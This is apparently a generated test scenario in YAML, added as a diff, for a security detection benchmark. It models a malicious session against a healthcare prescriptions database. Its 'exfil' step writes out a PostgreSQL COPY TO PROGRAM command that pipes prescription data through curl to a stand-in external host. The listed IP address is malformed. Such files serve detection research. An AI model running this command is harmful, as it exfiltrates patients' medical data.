@@ -1,0 +1,32 @@
+scenario_id: gen_healthcare_34_sql_injection_mal_921m
+family_id: gen_healthcare_34_sql_injection_fam_921
+domain: healthcare
+time_of_day: 04:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT drug_name, dosage FROM prescriptions WHERE patient_id > 331015
+  - step_id: exfil
+    sql: COPY (SELECT drug_name, dosage FROM prescriptions) TO PROGRAM 'curl -sX POST
+      https://sync.partner-mirror.example/ingest -d @-'
+    connects_to:
+      ip: 193.42.33.127.195
+      port: 443
+matched_pair_id: gen_healthcare_34_sql_injection_pair_921
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
